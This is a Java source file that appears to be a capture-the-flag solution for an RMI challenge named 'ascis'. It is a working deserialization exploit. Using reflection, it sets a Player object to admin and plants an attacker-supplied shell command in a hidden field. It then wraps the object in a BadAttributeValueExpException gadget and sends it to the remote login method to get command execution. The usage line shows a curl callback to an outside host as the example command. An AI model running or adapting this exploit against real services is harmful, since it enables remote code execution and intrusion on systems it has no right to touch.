package rmi;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.rmi.NotBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ASCISPlayer
{
    public static void main(String[] args) throws java.rmi.RemoteException, NotBoundException, Exception
    {
        if (args.length != 3) {
            System.out.println("Usage: java -jar ascis_rmi_v1_sol.jar localhost 1099 \"curl tsug0d.com:4321/?a=1\"");
            System.exit(0);
        }
        String rhost = args[0];
        Integer rport = Integer.parseInt(args[1]);
        String cmd = args[2];

        // On some project doesn't need this (?), maybe related to mac jdk security
        System.setProperty("java.security.policy", "./file.policy");
        System.setSecurityManager(new SecurityManager());

        // Connect to service
        Registry registry = LocateRegistry.getRegistry(rhost, rport);
        ASCISInterf ascisInterf = (ASCISInterf)registry.lookup("ascis");

        // Create player
        Player p = new Player();
        p.setAdmin(true);

        // Set Field
        Field cmdlog = p.getClass().getDeclaredField("logCommand");
        cmdlog.setAccessible(true);
        cmdlog.set(p, cmd);

        // gadget BadAttributeValueExpException.readObject() -> Player.toString()
        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        Field val = bad.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(bad, p);

        ascisInterf.login(bad);
    }
}

